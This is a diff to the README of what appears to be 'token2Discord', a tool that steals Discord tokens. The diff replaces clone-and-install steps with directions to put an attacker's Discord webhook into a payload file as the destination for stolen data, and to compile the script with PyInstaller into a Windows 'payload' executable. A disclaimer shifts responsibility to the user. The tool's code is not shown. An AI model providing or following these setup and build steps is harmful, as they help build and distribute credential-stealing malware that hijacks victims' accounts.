@@ -10,25 +10,16 @@ The user, YOU, are responsible for the usage of such utility. With that said, us
 2. Discord Webhook
 ```
 
-# Install
+# Setup
 ```
-git clone https://github.com/CharlesTheGreat/token2Discord
-
-# for pyvenv (optional)
-python3 -m venv <any_name>
-source <any_name>/bin/activate
-
-# required
-cd token2Discord/
-pip3 install -r requirements
+# edit token2Discord.txt
+Input your discord webhook in the payload file (txt file)
+$webhook = 'DISCORD_WEBHOOK'
 ```
 
-# Quick Start
-* Change in the token2Discord.py file:
-        self.WEBHOOK = "DISCORD_WEBHOOK"
-        -       to your discord webhook
-
-# Compile
+# Compile (if you want your own)
+• Be sure PyInstaller is installed
+$ pip3 install -r requirements.txt
 * When compiling as an executable, be sure you're on Windows for a Windows payload!! (Common Sense, as MacOS compiled payload will not run on a Windows!)
 ```
 python3 -m PyInstaller token2Discord.py --onefile
